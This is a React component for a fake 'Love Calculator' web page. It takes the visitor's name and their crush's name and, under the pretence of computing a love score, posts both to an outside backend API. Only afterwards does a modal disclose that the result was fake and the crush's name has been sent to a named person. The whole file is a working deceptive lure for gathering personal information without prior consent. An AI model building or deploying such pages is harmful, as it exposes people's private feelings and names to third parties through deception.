import React, { useState } from 'react';
import Navb from './Navbar.jsx';
import { Heart, Send, CheckCircle } from 'lucide-react'; // Importing icons

// The URL for the API endpoint
const API_ENDPOINT = 'https://love-backend-two.vercel.app/api/messages';

// The main Love Calculator component
export default function Home() {
  const [username, setUsername] = useState('');
  const [lovername, setLovername] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [error, setError] = useState(null);

  // --- Submission Handler ---
  const handleSubmit = async (e) => {
    e.preventDefault();
    setError(null);

    if (!username.trim() || !lovername.trim()) {
      setError('Please enter both your name and your crush\'s name!');
      return;
    }

    setIsLoading(true);

    try {
      // 1. Post Data to the specified API
      const response = await fetch(API_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, lovername }),
      });

      // We ignore the response status since the result is always the same (a prank)
      // but we ensure the request completed.
      if (!response.ok) {
        // Log a potential error, but proceed with the prank anyway for the user experience
        console.error("API call may have failed:", response.status);
      }

      // 2. Clear fields and show the Prank Modal
      setUsername('');
      setLovername('');
      setIsModalOpen(true);
      
    } catch (err) {
      // If the API call fails completely (e.g., server offline), still show the prank
      console.error("Failed to post names:", err);
      // For a better UX, we'll still show the prank, but in a real app, you'd show a failure message
      setUsername('');
      setLovername('');
      setIsModalOpen(true); 
    } finally {
      setIsLoading(false);
    }
  };

  // --- UI Rendering ---
  return (
    <div className="min-h-screen bg-pink-50 selection:bg-pink-200">
      <Navb />
      
      {/* Main Content Area */}
      <div className="container mx-auto px-4 py-16 flex flex-col items-center justify-center">
        
        {/* Title Block */}
        <div className="text-center mb-12">
          <Heart className="w-16 h-16 text-pink-500 mx-auto mb-4 animate-pulse" fill="currentColor" />
          <h2 className="text-4xl sm:text-5xl font-extrabold text-pink-700 tracking-tight leading-snug">
            💘 See How Much Your Crush Loves You!
          </h2>
          <p className="mt-4 text-xl text-gray-600 font-medium">
            Enter your name and your crush's name below for an instant result.
          </p>
        </div>

        {/* Love Calculator Card (The Core UI) */}
        <div className="w-full max-w-lg bg-white p-8 rounded-3xl shadow-2xl border-4 border-pink-300 transform transition duration-500 hover:scale-[1.02]">
          <form onSubmit={handleSubmit} className="space-y-6">
            
            {/* Input 1: Your Name */}
            <div>
              <label htmlFor="username" className="block text-lg font-semibold text-gray-700 mb-2">
                Your Name
              </label>
              <input
                id="username"
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="e.g. Dejene G."
                className="w-full px-5 py-3 border border-pink-300 rounded-xl focus:ring-2 focus:ring-pink-500 focus:border-pink-500 transition duration-150 text-gray-800 text-lg"
                required
              />
            </div>

            {/* Input 2: Crush's Name */}
            <div>
              <label htmlFor="lovername" className="block text-lg font-semibold text-gray-700 mb-2">
                Your Crush's Name
              </label>
              <input
                id="lovername"
                type="text"
                value={lovername}
                onChange={(e) => setLovername(e.target.value)}
                placeholder="e.g. Etsubdink M."
                className="w-full px-5 py-3 border border-pink-300 rounded-xl focus:ring-2 focus:ring-pink-500 focus:border-pink-500 transition duration-150 text-gray-800 text-lg"
                required
              />
            </div>
            
            {/* Error Message */}
            {error && (
              <p className="text-red-500 font-medium text-center bg-red-100 p-2 rounded-lg border border-red-300">
                {error}
              </p>
            )}

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full flex items-center justify-center gap-2 bg-pink-600 text-white font-bold py-3 rounded-xl hover:bg-pink-700 transition duration-200 transform hover:shadow-lg focus:outline-none focus:ring-4 focus:ring-pink-300 disabled:opacity-50 disabled:cursor-not-allowed text-xl"
            >
              {isLoading ? (
                <>
                  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Calculating...
                </>
              ) : (
                <>
                  <Send size={20} />
                  Calculate Love %
                </>
              )}
            </button>
          </form>
        </div>
      </div>

      {/* --- Prank Modal (Module) --- */}
      {isModalOpen && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 backdrop-blur-sm">
          <div className="bg-white p-8 rounded-2xl shadow-2xl max-w-sm w-full text-center border-4 border-red-500 animate-in fade-in zoom-in-50">
            <CheckCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
            <h3 className="text-3xl font-extrabold text-red-600 mb-4">
              😂 YOU'VE BEEN PRANKED! 🤣
            </h3>
            <p className="text-lg text-gray-700 mb-6">
              The love calculation is fake! But here is the catch:
            </p>
            <blockquote className="bg-yellow-100 p-4 rounded-xl border-l-4 border-yellow-500 italic text-gray-800 font-semibold mb-6">
               Your crush's name was just sent to **Abreham**! 😈
            </blockquote>
            <p className="text-sm text-gray-500 mb-6">
              (And yes, the data was actually posted to the API 🤫)
            </p>
            <button
              onClick={() => setIsModalOpen(false)}
              className="w-full bg-red-600 text-white font-bold py-3 rounded-lg hover:bg-red-700 transition duration-200"
            >
              Got It! (And Thanks for the laugh)
            </button>
          </div>
        </div>
      )}
    </div>
  );
}